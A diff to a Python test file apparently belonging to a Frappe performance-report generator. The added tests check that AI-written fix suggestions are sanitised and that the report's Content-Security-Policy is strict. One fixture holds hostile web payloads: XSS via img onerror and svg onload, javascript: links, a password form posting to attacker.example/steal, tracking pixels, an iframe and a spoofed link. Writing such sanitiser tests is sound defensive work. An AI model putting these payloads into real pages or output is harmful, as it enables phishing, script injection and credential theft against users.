@@ -139,10 +139,58 @@ def test_back_to_top_links_removed_find_in_page_note_kept():
 # Invariant self-contained / offline-safe
 # --------------------------------------------------------------------------
 
+_HOSTILE_SUGGESTION = (
+	"**Diagnosis**\n\n"
+	"![pixel](https://attacker.example/p.png)\n\n"
+	'<img src="https://attacker.example/i.png" onerror="alert(1)">\n\n'
+	'<form action="https://attacker.example/steal"><input type="password" name="pw"></form>\n\n'
+	'<div style="position:fixed;top:0;left:0">overlay</div>\n\n'
+	"[click here](https://attacker.example/phish)\n\n"
+	"[docs](https://attacker.example\\@docs.frappe.io/x)\n\n"
+	"[js](javascript:alert(1))\n\n"
+	'<iframe src="https://attacker.example/f"></iframe>\n\n'
+	'<svg onload="alert(1)"></svg>\n\n'
+	"<style>body{display:none}</style>\n\n"
+	"See [the docs](https://frappeframework.com) for more.\n\n"
+	"```diff\n- a = 1\n+ a = 2\n```\n"
+)
+
+
+def test_report_csp_keeps_styles_and_embedded_images_without_active_content():
+	html = _render()
+	policy = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', html)
+	assert policy is not None
+	directives = {parts[0]: parts[1:] for item in policy[1].split(";") if (parts := item.split())}
+	assert directives == {
+		"default-src": ["'none'"],
+		"style-src": ["'unsafe-inline'"],
+		"img-src": ["data:"],
+		"base-uri": ["'none'"],
+		"form-action": ["'none'"],
+	}
+	assert policy.start() < html.index("<style>")
+
+
 def test_report_is_self_contained_offline():
+	# A distinct callsite and type so root-cause grouping never folds it into
+	# the first finding's card.
+	hostile = _finding(
+		finding_type="Slow Query",
+		title="Hostile AI output",
+		technical_detail_json=json.dumps({"callsite": {
+			"filename": "/abs/myapp/bar.py", "lineno": 77, "function": "other",
+			"source_snippet": [{"lineno": 77, "content": "rows = frappe.db.sql(q)"}],
+		}}),
+		llm_fix_json=json.dumps({
+			"suggestion": _HOSTILE_SUGGESTION,
+			"model": '<img src="https://attacker.example/m.png">',
+			"provider": "x",
+			"generated_at": "t",
+		}),
+	)
 	html = _render(findings=[_finding(llm_fix_json=json.dumps({
 		"suggestion": "Batch it.", "model": "m", "provider": "x", "generated_at": "t",
-	}))])
+	})), hostile])
 	# No scripts / JS at all.
 	assert "<script" not in html.lower()
 	# No external RESOURCE loads (these would fetch over the network). Inline
@@ -154,3 +202,37 @@ def test_report_is_self_contained_offline():
 	# Anchor links (e.g. aerele.in) ARE allowed sanity-check one exists so the
 	# checks above aren't trivially passing on an empty page.
 	assert re.search(r'<a [^>]*href="https?://', html)
+	# P8 output: AI blocks carry no remote fetch, form, style or script.
+	bodies = re.findall(r'<div class="fix-body">(.*?)</div>\s*<div class="fix-foot">', html, re.S)
+	assert any("<strong>Diagnosis</strong>" in body for body in bodies)  # the hostile card rendered
+	for body in bodies:
+		low = body.lower()
+		for bad in ("<img", "<form", "<input", "<iframe", "<svg", "<style", "style=", "javascript:", "onerror", "onload", "src="):
+			assert bad not in low, bad
+		assert "attacker.example" not in low
+	assert "dh-add" in html  # diff colouring survived the strict allowlist
+	assert '<img src="https://attacker' not in html  # the model name is escaped too (Jinja autoescape)
+	assert 'href="https://frappeframework.com"' in html  # a legitimate doc link still renders as a live link
+
+
+# --------------------------------------------------------------------------
+# Review Focus 2: llm_fix_json written before prompt v2 still renders
+# --------------------------------------------------------------------------
+
+def test_legacy_llm_fix_json_renders():
+	legacy = {  # a row written before prompt v2: no prompt_version / guardrail / finish_reason
+		"suggestion": "**Diagnosis**: d\n**Fix**\n\nBatch the query.", "model": "qwen3-coder:30b",
+		"provider": "OpenAI-compatible", "generated_at": "2026-09-09T00:00:00+00:00", "source_available": True,
+		"tokens": {"prompt_tokens": 2900, "completion_tokens": 300, "total_tokens": 3200},
+	}
+	current = dict(
+		legacy,
+		prompt_version=3,
+		guardrail={"violations": ["raw-sql"], "reasked": True, "fallback": True},
+		finish_reason="stop",
+	)
+	for blob in (legacy, current):
+		html = _render(findings=[_finding(llm_fix_json=json.dumps(blob))])
+		assert html.count('class="fix-body"') == 1
+		assert "<p>Batch the query.</p>" in html
+		assert "AI &middot; qwen3-coder:30b &middot; 3200 tokens" in html
